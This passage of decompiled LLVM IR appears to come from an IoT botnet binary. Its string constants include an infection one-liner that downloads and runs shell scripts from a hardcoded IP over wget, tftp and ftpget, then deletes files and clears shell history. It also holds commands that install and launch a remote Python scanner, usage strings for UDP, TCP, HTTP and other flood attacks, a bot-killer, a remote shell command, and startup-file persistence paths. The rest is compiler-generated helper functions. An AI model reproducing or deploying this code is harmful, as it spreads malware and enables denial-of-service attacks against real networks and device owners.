i8]* @global_var_805cb34.553, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @global_var_805da70.596, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @global_var_805dae0.597, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @global_var_805ce9c.563, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_805db78.598, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_805e3cc.617, i32 0, i32 0), i8* getelementptr inbounds ([22 x i8], [22 x i8]* @global_var_805e416.618, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_805e42c.619, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_805e4a0.620, i32 0, i32 0), i8* getelementptr inbounds ([112 x i8], [112 x i8]* @global_var_805e514.621, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @global_var_805dbc4.599, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @global_var_805dc44.600, i32 0, i32 0), i8* getelementptr inbounds ([125 x i8], [125 x i8]* @global_var_805dcc4.601, i32 0, i32 0), i8* getelementptr inbounds ([125 x i8], [125 x i8]* @global_var_805dd44.602, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @global_var_805ddc4.603, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @global_var_805de44.604, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @global_var_805dec4.605, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @global_var_805df3c.606, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @global_var_805dfa8.607, i32 0, i32 0), i8* getelementptr inbounds ([127 x i8], [127 x i8]* @global_var_805e01c.608, i32 0, i32 0), i8* getelementptr inbounds ([59 x i8], [59 x i8]* @global_var_805e09c.609, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_8057c0c.321, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_805c80c.544, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @global_var_805e0d8.610, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @global_var_805e120.611, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @global_var_805c4d8.536, i32 0, i32 0), i8* getelementptr inbounds ([208 x i8], [208 x i8]* @global_var_805e164.612, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @global_var_805e234.613, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @global_var_805be54.519, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @global_var_805e290.614, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @global_var_805c1ac.528, i32 0, i32 0)]
@global_var_805efdc.626 = constant [62 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\00"
@global_var_805f01c.627 = constant [410 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.177.233.43/miggs.sh; chmod 777 miggs.sh; sh miggs.sh; tftp 94.177.233.43 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 94.177.233.43; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 94.177.233.43 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf miggs.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; history -c\00"
@global_var_805f1b6.628 = constant [4 x i8] c"%d\0A\00"
@global_var_805f1ba.629 = constant [7 x i8] c"PYTHON\00"
@global_var_805f1c1.630 = constant [8 x i8] c"INSTALL\00"
@global_var_805f1cc.631 = constant [141 x i8] c"sudo yum install python-paramiko -y;sudo apt-get install python-paramiko -y;sudo mkdir /.tmp/;cd /.tmp;wget 94.177.233.43  2       /good2.py\00"
@global_var_805f259.632 = constant [26 x i8] c"INSTALLING PYTHON SCANNER\00"
@global_var_805f273.633 = constant [7 x i8] c"UPDATE\00"
@global_var_805f27c.634 = constant [58 x i8] c"cd /.tmp;rm -rf *py;wget 94.177.233.43  2       /good2.py\00"
@global_var_805f2b6.635 = constant [24 x i8] c"UPDATING PYTHON SCANNER\00"
@global_var_805f2ce.636 = constant [4 x i8] c"OFF\00"
@global_var_805f2d4.637 = constant [31 x i8] c"killall -9 python;pkill python\00"
@global_var_805f2f3.638 = constant [24 x i8] c"STOPPING PYTHON SCANNER\00"
@global_var_805f30b.639 = constant [6 x i8] c"START\00"
@global_var_805f314.640 = constant [40 x i8] c"cd /.tmp;python good2.py 1000 LUCKY 1 3\00"
@global_var_805f33c.641 = constant [28 x i8] c"STARTING VOIDS HACKA SCANNA\00"
@global_var_805f358.642 = constant [6 x i8] c"PONG!\00"
@global_var_805f35e.643 = constant [6 x i8] c"TABLE\00"
@global_var_805f364.644 = constant [3 x i8] c"%d\00"
@global_var_805f367.645 = constant [25 x i8] c"UPDATE TAKEN SUCCESFULLY\00"
@global_var_805f380.646 = constant [8 x i8] c"SCANNER\00"
@global_var_8067810.647 = local_unnamed_addr global i32 0
@global_var_805f388.648 = constant [17 x i8] c"STOPPING SCANNER\00"
@global_var_805f399.649 = constant [3 x i8] c"ON\00"
@global_var_805f39c.650 = constant [26 x i8] c"STARTING SCANNER ON -> %s\00"
@global_var_805f3b6.651 = constant [6 x i8] c"NETIS\00"
@global_var_805f3bc.652 = constant [23 x i8] c"STOPPING NETIS SCANNER\00"
@global_var_805f3d3.653 = constant [23 x i8] c"STARTING NETIS SCANNER\00"
@global_var_805f3ea.654 = constant [8 x i8] c"REMOVER\00"
@global_var_805f3f2.655 = constant [29 x i8] c"COMMENCING BOT KILL ON -> %s\00"
@global_var_805f40f.656 = constant [12 x i8] c"GETPUBLICIP\00"
@global_var_805f41b.657 = constant [17 x i8] c"My Public IP: %s\00"
@global_var_805f42c.658 = constant [4 x i8] c"UDP\00"
@global_var_805f430.659 = constant [113 x i8] c"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>\00"
@global_var_805f4a1.660 = constant [4 x i8] c"TCP\00"
@global_var_805f4a8.661 = constant [186 x i8] c"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)\00"
@global_var_805f562.662 = constant [5 x i8] c"HTTP\00"
@global_var_805f567.663 = constant [4 x i8] c"CNC\00"
@global_var_805f56b.664 = constant [27 x i8] c"CNC <target> <port> <time>\00"
@global_var_805f586.665 = constant [4 x i8] c"STD\00"
@global_var_805f58a.666 = constant [27 x i8] c"STD <target> <port> <time>\00"
@global_var_805f5a5.667 = constant [9 x i8] c"KILLATTK\00"
@global_var_805f5ae.668 = constant [11 x i8] c"Killed %d.\00"
@global_var_805f5b9.669 = constant [13 x i8] c"None Killed.\00"
@global_var_805f5c6.670 = constant [10 x i8] c"LOLNOGTFO\00"
@global_var_806119c.671 = local_unnamed_addr global i32 -1
@global_var_8061198.672 = global [18 x i8]* @global_var_8056acf.312
@global_var_805f5d0.673 = constant [8 x i8] c"8.8.8.8\00"
@global_var_805f5d8.674 = constant [16 x i8] c"/proc/net/route\00"
@global_var_805f5e8.675 = constant [11 x i8] c"\0900000000\09\00"
@global_var_805f5f3.677 = constant [11 x i8] c"PROMETHEUS\00"
@global_var_805f5fe.678 = constant i32 1952788224
@global_var_805f5ff.679 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@global_var_805f612.680 = constant i32 1697579122
@global_var_805f614.681 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_805f623.683 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_805f62b.684 = constant i32 1868955745
@global_var_805f62d.685 = constant [13 x i8] c"fork failed\0A\00"
@global_var_805f63a.686 = constant [12 x i8] c"BUILD %s:%s\00"
@global_var_805f646.687 = constant [5 x i8] c"PONG\00"
@global_var_805f64b.688 = constant [4 x i8] c"DUP\00"
@global_var_805f64f.689 = constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00"
@global_var_805f663.690 = constant [3 x i8] c"SH\00"
@global_var_805f666.691 = constant [8 x i8] c"%s 2>&1\00"
@global_var_805f66e.692 = constant [3 x i8] c"%s\00"
@global_var_805f671.693 = constant i32 32
@global_var_80677d0.694 = local_unnamed_addr global i32 0
@global_var_80612cc = external local_unnamed_addr global i32
@global_var_8061340.697 = global i32 288
@global_var_8061390.698 = local_unnamed_addr global i32 272
@global_var_80677e0.700 = global i32 0
@global_var_8061308.701 = global i32 0
@global_var_80655a4.702 = local_unnamed_addr global i32 0
@global_var_80655a8.703 = local_unnamed_addr global i32 0
@global_var_8061320.704 = local_unnamed_addr global i32 2
@global_var_80612f0.705 = global i32 0
@global_var_80612ec.706 = global i32* @global_var_8061340.697
@global_var_805fc80.707 = constant i32 0
@global_var_805fc98.708 = constant [6 x i8] c"(nil)\00"
@global_var_805fc9e.709 = constant [7 x i8] c"(null)\00"
@global_var_805fca5.710 = constant i32 2949163
@global_var_805fd12.712 = constant i32 327688
@global_var_805fd0a.713 = constant [8 x i8] c" +0-#'I\00"
@global_var_805fcb8.714 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_805fcf5.715 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_805fceb.716 = constant i32 117506048
@global_var_805fcdc.717 = constant i32 331776
@global_var_805fd60.718 = constant [8 x i8] c"Success\00"
@global_var_805fd36.719 = constant [15 x i8] c"Unknown error \00"
@global_var_8060c60.720 = constant i32 65536
@global_var_8061540.721 = local_unnamed_addr global i32* @global_var_8060c60.720
@global_var_80675c0.722 = global i32 0
@global_var_80675c4.723 = global i32 0
@global_var_80675e0.724 = global i32 0
@global_var_80677ac.725 = global i32 0
@global_var_8061548.726 = global i32 0
@global_var_8067c34.727 = local_unnamed_addr global i32 0
@global_var_8067c28.728 = global i32 0
@global_var_8067820.729 = global i32 0
@global_var_8061430.730 = global i32 0
@global_var_80678cc.732 = global i32 0
@global_var_80678d0.733 = local_unnamed_addr global i32 0
@global_var_80678d4.734 = global i32 0
@global_var_80678e0.735 = local_unnamed_addr global i32 0
@global_var_8067bd4.736 = global i32 0
@global_var_8067bfc.737 = local_unnamed_addr global i32 0
@global_var_8067bec.738 = local_unnamed_addr global i32 0
@global_var_8067bf0.739 = local_unnamed_addr global i32 0
@global_var_8067bf4.740 = local_unnamed_addr global i32 0
@global_var_8067bf8.741 = local_unnamed_addr global i32 0
@global_var_8067c04.742 = local_unnamed_addr global i32 0
@global_var_8067c10.743 = local_unnamed_addr global i32 0
@global_var_8067c08.744 = local_unnamed_addr global i32 0
@global_var_8067c14.745 = local_unnamed_addr global i32 0
@global_var_8067be8.746 = local_unnamed_addr global i32 0
@global_var_8067be4.748 = local_unnamed_addr global i32 0
@global_var_8067c0c.749 = local_unnamed_addr global i32 0
@global_var_80678dc.750 = local_unnamed_addr global i32 0
@global_var_8061448.751 = global i32 0
@global_var_8061460.753 = global i32 0
@global_var_8061478 = external global i32
@global_var_80614a4.755 = global i32 -1726662223
@global_var_8061480.756 = local_unnamed_addr global i32* @global_var_80614a4.755
@global_var_806147c.757 = global i32* @global_var_80614a4.755
@global_var_80608d4.758 = constant i32 0
@global_var_80608c0.759 = constant i32 0
@global_var_80608e8.760 = constant [3 x i8] c"-c\00"
@global_var_80608f0.761 = constant [3 x i8] c"sh\00"
@global_var_80608eb.762 = constant [8 x i8] c"/bin/sh\00"
@global_var_8061520.763 = global i32 0
@global_var_80677c4.764 = local_unnamed_addr global i32 0
@global_var_80677cc.765 = local_unnamed_addr global i32 0
@global_var_8061000.767 = global i32 -1
@global_var_80539f3.768 = constant i32 -294069
@global_var_80677d4.769 = local_unnamed_addr global i32 0
@global_var_80677d8.770 = local_unnamed_addr global i32 0
@global_var_8060b4c.771 = constant [10 x i8] c"/dev/null\00"
@global_var_80677c8.773 = local_unnamed_addr global i32 0
@global_var_8053bd9.775 = constant i32 1928542531
@global_var_8053bfd.776 = constant i32 1928542531
@global_var_8067804.777 = local_unnamed_addr global i32 0
@global_var_80677e4.778 = global i32 0
@global_var_8060e70.780 = constant [4 x i8] c"inf\00"
@global_var_8060e73.785 = constant i32 1179535616
@global_var_8060e80.786 = constant i32 2883630
@global_var_8067c38.790 = local_unnamed_addr global i32 0
@global_var_8060f3c.791 = constant i32 1697579054
@global_var_8060f70.792 = constant i32 1868824690
@global_var_8060f3e.793 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_8060f4f.794 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_8060f67.795 = constant [11 x i8] c"nameserver\00"
@global_var_8060f72.796 = constant [7 x i8] c"domain\00"
@global_var_8060f79.797 = constant [7 x i8] c"search\00"
@global_var_8067c18.798 = global i32 0
@global_var_8067c3c.799 = local_unnamed_addr global i32 0
@global_var_8067c40.800 = local_unnamed_addr global i32 0
@global_var_8060f94.801 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_8060f91.803 = constant [3 x i8] c"%x\00"
@global_var_8060fa5.804 = constant [11 x i8] c"/etc/hosts\00"
@global_var_8060fb0.805 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_8061560.1 = local_unnamed_addr global i8 0
@global_var_80655a0.13 = external local_unnamed_addr global i8*
@global_var_8061597.38 = local_unnamed_addr global i8 0
@global_var_8061598.39 = local_unnamed_addr global i8 0
@global_var_8061599.40 = local_unnamed_addr global i8 0
@global_var_806159a.41 = local_unnamed_addr global i8 0
@global_var_8061596.155 = local_unnamed_addr global i8 0
@global_var_8061590.676 = external global i8*
@1 = internal constant [2 x i8] c"/\00"
@global_var_805f621.682 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@global_var_805fd2a.711 = external constant i8*
@global_var_80678a0.731 = global i8 0
@global_var_8067c00.747 = local_unnamed_addr global i8 0
@global_var_80677c0.752 = local_unnamed_addr global i8 0
@global_var_80677dc.772 = local_unnamed_addr global i8 0
@global_var_80677e8.787 = external global i8*
@global_var_8067800.788 = local_unnamed_addr global i64 0
@global_var_8061544.789 = local_unnamed_addr global i16 1

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @__get_pc_thunk_bx(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 102263
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @frame_dummy()
  %v0_80480a8 = call i32 @__do_global_ctors_aux()
  ret i32 %v0_80480a8
}

define i32 @__get_pc_thunk_bx(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_80480c6 = load i8, i8* @global_var_8061560.1, align 32
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %entry.dec_label_pc_8048106_crit_edge

entry.dec_label_pc_8048106_crit_edge:             ; preds = %entry
  %v0_8048107.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048106

dec_label_pc_80480db.preheader:                   ; preds = %entry
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_8061024.3 to i32*), align 4
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e49 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e49, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_8061024.3 to i32*), align 4
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_8061024.3 to i32*), align 4
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_8061560.1, align 32
  br label %dec_label_pc_8048106

dec_label_pc_8048106:                             ; preds = %entry.dec_label_pc_8048106_crit_edge, %dec_label_pc_80480e6
  %v0_8048107 = phi i32 [ %v0_8048107.pre, %entry.dec_label_pc_8048106_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048107

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_8061024.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_8061560.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048106, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_8048140, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048138 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_8060fc4.4 to i32))
  br label %dec_label_pc_8048140

dec_label_pc_8048140:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_8048140 = load i32, i32* @global_var_8061010.6, align 16
  %v1_8048145 = icmp eq i32 %v0_8048140, 0
  br i1 %v1_8048145, label %dec_label_pc_804815f, label %dec_label_pc_8048149

dec_label_pc_8048149:                             ; preds = %dec_label_pc_8048140
  br label %dec_label_pc_804815f

dec_label_pc_804815f:                             ; preds = %dec_label_pc_8048149, %dec_label_pc_8048140
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_8048140, { 1, 0 }
}

define i32 @_start(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v0_804816c = load i32, i32* @eax, align 4
  store i32 %v0_804816c, i32* %stack_var_-4, align 4
  %v4_804816c = ptrtoint i32* %stack_var_-4 to i32
  %v0_804816e = load i32, i32* @edx, align 4
  %v9_8048180 = call i32 @__uClibc_main(i32 134540985, i32 %arg1, i32* nonnull %stack_var_4, i32 134512788, i32 134572264, i32 %v0_804816e, i32 %v4_804816c, i32 %v0_804816c)
  ret i32 %v9_8048180

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @global_var_80615a0.7, align 32
  %v1_8048199 = add i32 %arg1, -1640531527
  store i32 %v1_8048199, i32* @global_var_80615a4.8, align 4
  %v1_80481a6 = add i32 %arg1, 1013904242
  store i32 %v1_80481a6, i32* %eax.global-to-local, align 4
  store i32 %v1_80481a6, i32* @global_var_80615a8.9, align 8
  br label %dec_label_pc_80481b9

dec_label_pc_80481b9:                             ; preds = %entry, %dec_label_pc_80481b9
  %storemerge5 = phi i32 [ 3, %entry ], [ %v4_80481e9, %dec_label_pc_80481b9 ]
  %v1_80481bf = add nsw i32 %storemerge5, -3
  store i32 %v1_80481bf, i32* %eax.global-to-local, align 4
  %v1_80481c2 = mul nuw nsw i32 %v1_80481bf, 4
  %v2_80481c2 = add i32 %v1_80481c2, ptrtoint (i32* @global_var_80615a0.7 to i32)
  %v3_80481c2 = inttoptr i32 %v2_80481c2 to i32*
  %v4_80481c2 = load i32, i32* %v3_80481c2, align 4
  %v1_80481cc = add nsw i32 %storemerge5, -2
  store i32 %v1_80481cc, i32* %eax.global-to-local, align 4
  %v1_80481cf = mul nuw nsw i32 %v1_80481cc, 4
  %v2_80481cf = add i32 %v1_80481cf, ptrtoint (i32* @global_var_80615a0.7 to i32)
  %v3_80481cf = inttoptr i32 %v2_80481cf to i32*
  %v4_80481cf = load i32, i32* %v3_80481cf, align 4
  %v2_80481d6 = xor i32 %v4_80481cf, %v4_80481c2
  %v2_80481db = xor i32 %storemerge5, -1640531527
  %v1_80481dd = xor i32 %v2_80481db, %v2_80481d6
  store i32 %v1_80481dd, i32* %eax.global-to-local, align 4
  %v2_80481e2 = mul nuw nsw i32 %storemerge5, 4
  %v3_80481e2 = add i32 %v2_80481e2, ptrtoint (i32* @global_var_80615a0.7 to i32)
  %v4_80481e2 = inttoptr i32 %v3_80481e2 to i32*
  store i32 %v1_80481dd, i32* %v4_80481e2, align 4
  %v4_80481e9 = add nuw nsw i32 %storemerge5, 1
  %exitcond = icmp eq i32 %v4_80481e9, 4096
  br i1 %exitcond, label %dec_label_pc_80481f5, label %dec_label_pc_80481b9

dec_label_pc_80481f5:                             ; preds = %dec_label_pc_80481b9
  %v0_80481f6 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_80481f6

; uselistorder directives
  uselistorder i32 %storemerge5, { 2, 3, 4, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80481b9, { 1, 0 }
}

define i32 @rand_cmwc(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8048213 = load i32, i32* @global_var_80612c4.10, align 4
  %v1_8048218 = add i32 %v0_8048213, 1
  %v1_8048219 = urem i32 %v1_8048218, 4096
  store i32 %v1_8048219, i32* @global_var_80612c4.10, align 4
  %v1_8048228 = mul nuw nsw i32 %v1_8048219, 4
  %v2_8048228 = add i32 %v1_8048228, ptrtoint (i32* @global_var_80615a0.7 to i32)
  %v3_8048228 = inttoptr i32 %v2_8048228 to i32*
  %v4_8048228 = load i32, i32* %v3_8048228, align 4
  %v7_8048245 = udiv i32 %v4_8048228, 228675
  store i32 %v7_8048245, i32* @global_var_80612c0.11, align 64
  br i1 true, label %dec_label_pc_8048295, label %dec_label_pc_8048287

dec_label_pc_8048287:                             ; preds = %entry
  br label %dec_label_pc_8048295

dec_label_pc_8048295:                             ; preds = %entry, %dec_label_pc_8048287
  store i32 %v1_8048219, i32* @ecx, align 4
  %v1_80482aa = mul nuw nsw i32 %v1_8048219, 4
  %v2_80482aa = add i32 %v1_80482aa, ptrtoint (i32* @global_var_80615a0.7 to i32)
  %v3_80482aa = inttoptr i32 %v2_80482aa to i32*
  %v4_80482aa = load i32, i32* %v3_80482aa, align 4
  ret i32 %v4_80482aa

; uselistorder directives
  uselistorder i32 %v1_8048219, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8048295, { 1, 0 }
}

define i32 @trim() local_unnamed_addr {
entry:
  %tmp10 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-8 = alloca i32, align 4
  %v0_80482ba = load i32, i32* @edi, align 4
  store i32 %v0_80482ba, i32* %stack_var_-8, align 4
  %v4_80482c5 = ptrtoint i8* %tmp10 to i32
  store i1 false, i1* @df, align 1
  %v3_80482d6 = call i32 @_strlen(i8* %tmp10)
  %v1_80482dd = add i32 %v3_80482d6, -1
  br label %dec_label_pc_80482e6

dec_label_pc_80482e3:                             ; preds = %dec_label_pc_80482e6
  %v4_80482e3 = add i32 %stack_var_-16.0, 1
  br label %dec_label_pc_80482e6

dec_label_pc_80482e6:                             ; preds = %entry, %dec_label_pc_80482e3
  %stack_var_-16.0 = phi i32 [ 0, %entry ], [ %v4_80482e3, %dec_label_pc_80482e3 ]
  %v6_80482e9 = add i32 %stack_var_-16.0, %v4_80482c5
  %v1_80482ec = inttoptr i32 %v6_80482e9 to i8*
  %v2_80482ec = load i8, i8* %v1_80482ec, align 1
  %v2_80482ee = sext i8 %v2_80482ec to i32
  %v1_80482f5 = call i32 @isspace(i32 %v2_80482ee)
  %v1_80482fd = icmp eq i32 %v1_80482f5, 0
  %v1_80482ff = icmp eq i1 %v1_80482fd, false
  br i1 %v1_80482ff, label %dec_label_pc_80482e3, label %dec_label_pc_8048306.preheader

dec_label_pc_8048306.preheader:                   ; preds = %dec_label_pc_80482e6
  %v5_804830c24 = icmp slt i32 %v1_80482dd, %stack_var_-16.0
  br i1 %v5_804830c24, label %dec_label_pc_8048329, label %dec_label_pc_804830e.lr.ph

dec_label_pc_804830e.lr.ph:                       ; preds = %dec_label_pc_8048306.preheader
  br label %dec_label_pc_804830e

dec_label_pc_8048303:                             ; preds = %dec_label_pc_804830e
  %v5_8048303 = add i32 %stack_var_-12.0.in25, -1
  %v5_804830c = icmp slt i32 %v5_8048303, %stack_var_-16.0
  br i1 %v5_804830c, label %dec_label_pc_8048329, label %dec_label_pc_804830e

dec_label_pc_804830e:                             ; preds = %dec_label_pc_804830e.lr.ph, %dec_label_pc_8048303
  %stack_var_-12.0.in25 = phi i32 [ %v1_80482dd, %dec_label_pc_804830e.lr.ph ], [ %v5_8048303, %dec_label_pc_8048303 ]
  %v6_8048311 = add i32 %stack_var_-12.0.in25, %v4_80482c5
  %v1_8048314 = inttoptr i32 %v6_8048311 to i8*
  %v2_8048314 = load i8, i8* %v1_8048314, align 1
  %v2_8048316 = sext i8 %v2_8048314 to i32
  %v1_804831d = call i32 @isspace(i32 %v2_8048316)
  %v1_8048325 = icmp eq i32 %v1_804831d, 0
  %v1_8048327 = icmp eq i1 %v1_8048325, false
  br i1 %v1_8048327, label %dec_label_pc_8048303, label %dec_label_pc_8048329

dec_label_pc_8048329:                             ; preds = %dec_label_pc_8048303, %dec_label_pc_804830e, %dec_label_pc_8048306.preheader
  %stack_var_-12.0.in.lcssa = phi i32 [ %v1_80482dd, %dec_label_pc_8048306.preheader ], [ %stack_var_-12.0.in25, %dec_label_pc_804830e ], [ %v5_8048303, %dec_label_pc_8048303 ]
  %v7_804835118 = icmp sgt i32 %stack_var_-16.0, %stack_var_-12.0.in.lcssa
  br i1 %v7_804835118, label %dec_label_pc_8048353, label %dec_label_pc_8048331

dec_label_pc_8048331:                             ; preds = %dec_label_pc_8048329, %dec_label_pc_8048331
  %v6_804835b20 = phi i32 [ %v6_804835b, %dec_label_pc_8048331 ], [ %v4_80482c5, %dec_label_pc_8048329 ]
  %storemerge.in19 = phi i32 [ %v5_8048348, %dec_label_pc_8048331 ], [ %stack_var_-16.0, %dec_label_pc_8048329 ]
  %v6_8048341 = add i32 %storemerge.in19, %v4_80482c5
  %v1_8048344 = inttoptr i32 %v6_8048341 to i8*
  %v2_8048344 = load i8, i8* %v1_8048344, align 1
  %v3_8048346 = inttoptr i32 %v6_804835b20 to i8*
  store i8 %v2_8048344, i8* %v3_8048346, align 1
  %v5_8048348 = add i32 %storemerge.in19, 1
  %v7_8048351 = icmp sgt i32 %v5_8048348, %stack_var_-12.0.in.lcssa
  %v2_8048359 = sub i32 %v5_8048348, %stack_var_-16.0
  %v6_804835b = add i32 %v2_8048359, %v4_80482c5
  br i1 %v7_8048351, label %dec_label_pc_8048353, label %dec_label_pc_8048331

dec_label_pc_8048353:                             ; preds = %dec_label_pc_8048331, %dec_label_pc_8048329
  %v6_804835b.lcssa = phi i32 [ %v4_80482c5, %dec_label_pc_8048329 ], [ %v6_804835b, %dec_label_pc_8048331 ]
  %v22_804835b = inttoptr i32 %v6_804835b.lcssa to i8*
  store i8 0, i8* %v22_804835b, align 1
  %v3_8048361 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8048361, i32* @edi, align 4
  ret i32 %v6_804835b.lcssa

; uselistorder directives
  uselistorder i32 %v6_804835b.lcssa, { 1, 0 }
  uselistorder i32 %v5_8048348, { 2, 1, 0 }
  uselistorder i32 %stack_var_-12.0.in.lcssa, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.in25, { 0, 2, 1 }
  uselistorder i32 %v5_8048303, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0, 3, 2, 4, 5, 6 }
  uselistorder i32 %v1_80482dd, { 2, 1, 0 }
  uselistorder i32 %v4_80482c5, { 0, 2, 3, 1, 4, 5 }
  uselistorder i8* %tmp10, { 1, 0 }
  uselistorder i32 (i32)* @isspace, { 1, 0 }
  uselistorder label %dec_label_pc_8048331, { 1, 0 }
